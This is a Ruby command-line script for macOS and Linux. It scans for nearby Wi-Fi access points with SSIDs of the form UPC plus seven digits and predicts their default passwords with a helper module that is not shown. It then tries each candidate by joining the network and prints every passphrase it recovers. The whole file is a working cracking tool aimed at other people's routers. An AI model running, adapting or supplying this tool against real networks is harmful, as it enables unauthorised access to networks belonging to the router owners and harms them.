#!/usr/bin/env ruby

require 'optparse'
require 'rbconfig'

require_relative 'upc_keys.rb'

def scan
  ssids = if $os == 'mac'
    `/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport scan | awk '{ print $1; }' 2> /dev/null`.split("\n")
  elsif $os == 'linux'
    `nmcli d wifi | awk '{ print $1; }' 2> /dev/null`.gsub(/\\['"]/, '').split('\n')
  end
  ssids.select{ |i| i[/^UPC\d{7}$/] }
end

def try_password interface, ssid, password
  if $os == 'mac'
    if `networksetup -setairportnetwork #{interface} "#{ssid}" "#{password}"`.empty?
      sleep(5)
      return true if `/sbin/ifconfig #{interface} | grep "inet " | cut -d " " -f2`
    end
  elsif $os == 'linux'
    unless `nmcli -w 4 dev wifi con "#{ssid}" password "#{password}" name "ced" 2> /dev/null`.downcase.include? 'error'
      return true if `/sbin/ifconfig #{interface} | grep "inet addr:" | cut -d: -f2 | awk "{ print $1}"`
    end
  end
  false
end

def cleanup interface, ssid
  if $os == 'mac'
    `/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -z`
    `networksetup -removepreferredwirelessnetwork #{interface} #{ssid}`
  elsif $os == 'linux'
    `nmcli con delete id "ced"`
    `nmcli con down "#{ssid}"`
  end
  sleep(2)
end

def crack interface, ssid
  passwords = predict_passwords ssid
  puts "#{passwords.size} possible keys found for #{ssid}"
  print '  Trying keys'
  passwords.each do |password|
    print '.'
    return password if try_password interface, ssid, password
  end
  nil
end

if $0 == __FILE__
  interface = ''
  ssids = []
  $os = RbConfig::CONFIG['host_os']

  case
  when $os.downcase.include?('linux')
    $os = 'linux'
  when $os.downcase.include?('darwin')
    $os = 'mac'
  else
    puts 'You are not on a supported platform. exiting...'
    puts 'Mac OS X and Linux are the only supported platforms.'
    exit
  end

  OptionParser.new do |opts|
    opts.banner = 'Usage: script.rb [options]'
    opts.on('-i', '--interface=INTERFACE', String, 'The interface on which to operate') { |v| interface = v }
    opts.on('-s', '--ssid=SSID', String, 'The SSID of the vulnerable UPC access point') { |v| ssids.push v }
  end.parse!
  raise OptionParser::MissingArgument, '--interface' if interface.empty?


  if ssids.empty?
    puts 'Searching for vulnerable accesspoints.'
    ssids = scan
    puts "#{ssids.size} vulnerable accesspoint(s) found."
  end

  result = {}
  ssids.each do |ssid|
    password = crack interface, ssid
    puts ''
    if password
      result[ssid] = password
      puts "  Password: #{password}"
    end
    cleanup interface, ssid
  end

 puts 'Recovered passphrases:'
  result.each do |ssid, password|
    puts "  #{ssid}: #{password}"
  end
end
